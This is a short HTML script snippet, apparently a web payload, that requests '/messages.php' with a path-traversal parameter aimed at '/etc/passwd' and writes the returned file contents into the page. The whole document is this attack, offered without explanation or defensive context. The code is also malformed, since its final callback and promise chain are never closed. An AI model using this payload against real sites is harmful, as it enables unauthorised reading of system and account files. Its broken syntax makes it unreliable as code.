<script>
fetch("/messages.php?file=/../../../../etc/passwd", {
  method: "GET",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
})
  .then(response => response.text())
  .then(data => {
    document.write("<pre>" + data + "</pre>");
</script>